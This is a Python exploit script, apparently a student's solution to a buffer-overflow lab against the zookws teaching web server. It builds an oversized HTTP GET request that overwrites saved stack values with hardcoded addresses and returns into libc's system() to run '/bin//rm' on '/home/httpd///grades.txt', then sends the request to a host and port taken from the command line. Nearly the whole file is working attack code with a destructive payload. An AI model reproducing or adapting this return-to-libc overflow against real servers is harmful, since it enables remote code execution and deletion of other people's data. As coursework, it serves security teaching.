#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct
import time

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xdeadc0de

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    # 0xbfffddd8
    curr_ebp = "\xd8\xdd\xff\xbf" 
    pos_eip_shellcode_addr = "\xe0\xdd\xff\xbf"
    nop_slide = "\x90"*4
    # 8 chars
    rm_string = "\x2f\x62\x69\x6e\x2f\x2f\x72\x6d"
    space_url_encoded = "+" # Ascii value for + 
    grades_string = "\x2f\x68\x6f\x6d\x65\x2f\x68\x74\x74\x70\x64\x2f\x2f\x2f\x67\x72\x61\x64\x65\x73\x2e\x74\x78\x74"
    # 4 chars
    null_bytes = "\x00\x00\x00\x00"
    system_arg_string = rm_string + space_url_encoded + grades_string + " " + "aa"
    reserve_space = 40
    
    env_addr = "\x08\xe6\xff\xbf" 
    args = system_arg_string + env_addr + " " + "a" *3 

    system_libc_addr = "\x00\x51\x06\x40"
    rm_string_addr = "\xc4\xcd\xff\xbf"

    buffer_string = 'a'*( 40 - reserve_space - 4) + args

    req =  "GET /%s %sHTTP/1.0 \r\n" % (buffer_string,"a"*4058 +env_addr*3  + curr_ebp + system_libc_addr+null_bytes+rm_string_addr + "\x00\x08\x00\x00" + env_addr + "\xc4\xcf\xff\xbf")
    req += "\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

